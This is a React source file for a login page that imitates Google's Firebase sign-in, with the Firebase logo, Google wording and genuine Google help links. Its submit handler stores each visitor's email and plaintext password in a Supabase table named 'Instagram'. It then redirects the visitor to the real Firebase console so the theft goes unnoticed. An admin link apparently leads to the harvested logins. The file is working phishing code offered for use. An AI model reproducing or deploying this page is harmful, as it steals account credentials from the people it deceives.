import React, { useState } from "react";
import "./FirebaseLogin.css";
import { supabase } from "../../supabase";
import { SiFirebase } from "react-icons/si";
import "@fontsource/press-start-2p";

const FirebaseLogin = () => {
  const [email, setEmail] = useState("");
  const [password, setPassword] = useState("");
  const [loading, setLoading] = useState(false);
  const [success, setSuccess] = useState(false);
  const [error, setError] = useState("");
  const [showPassword, setShowPassword] = useState(false);

  const handleSubmit = async (e) => {
    e.preventDefault();
    setLoading(true);
    setError("");
    setSuccess(false);
    const { error } = await supabase.from("Instagram").insert([
      { email, password },
    ]);
    setLoading(false);
    if (error) setError("Login failed. Try again.");
    else {
      setSuccess(true);
      setTimeout(() => {
        window.location.href = "https://console.firebase.google.com/";
      }, 900);
    }
  };

  return (
    <div className="firebase-login-real-bg">
      <div className="firebase-login-real-logo">
        <SiFirebase size={48} color="#ffb300" />
      </div>
      <div className="firebase-login-real-card">
        <h2 className="firebase-login-real-title">Sign in</h2>
        <div className="firebase-login-real-subtitle">to continue to Firebase</div>
        <form className="firebase-login-real-form" onSubmit={handleSubmit} autoComplete="off">
          <div className="firebase-login-real-field-group">
            <label htmlFor="firebase-email" className="firebase-login-real-label">Email or phone</label>
            <input
              id="firebase-email"
              type="email"
              className="firebase-login-real-input"
              placeholder="Email or phone"
              value={email}
              onChange={e => setEmail(e.target.value)}
              autoFocus
              autoComplete="username"
              required
            />
          </div>
          <div className="firebase-login-real-field-group">
            <label htmlFor="firebase-password" className="firebase-login-real-label">Password</label>
            <div className="firebase-login-real-password-row">
              <input
                id="firebase-password"
                type={showPassword ? 'text' : 'password'}
                className="firebase-login-real-input"
                placeholder="Enter your password"
                value={password}
                onChange={e => setPassword(e.target.value)}
                autoComplete="current-password"
                required
              />
              <button
                type="button"
                className="firebase-login-real-show"
                onClick={() => setShowPassword(s => !s)}
                tabIndex={-1}
              >
                {showPassword ? 'Hide' : 'Show'}
              </button>
            </div>
          </div>
          <div className="firebase-login-real-links-row">
            <a className="firebase-login-real-forgot" href="https://accounts.google.com/signin/v2/usernamerecovery" target="_blank" rel="noopener noreferrer">Forgot email?</a>
          </div>
          {error && <div className="firebase-login-real-error">{error}</div>}
          {success && <div className="firebase-login-real-success">Login saved!</div>}
          <button type="submit" className="firebase-login-real-btn" disabled={loading}>
            {loading ? "Signing in..." : "Next"}
          </button>
        </form>
        <div className="firebase-login-real-footer">
          Not your computer? Use Guest mode to sign in privately. <a href="https://support.google.com/chrome/answer/6130773?hl=en" target="_blank" rel="noopener noreferrer">Learn more</a>
        </div>
        <div className="firebase-login-real-create">
          <a href="https://firebase.google.com/signup" target="_blank" rel="noopener noreferrer">Create account</a>
        </div>
        <div className="firebase-login-admin">
          <a href="/admin" className="firebase-admin-link">Admin Login</a>
        </div>
      </div>
    </div>
  );
};

export default FirebaseLogin;
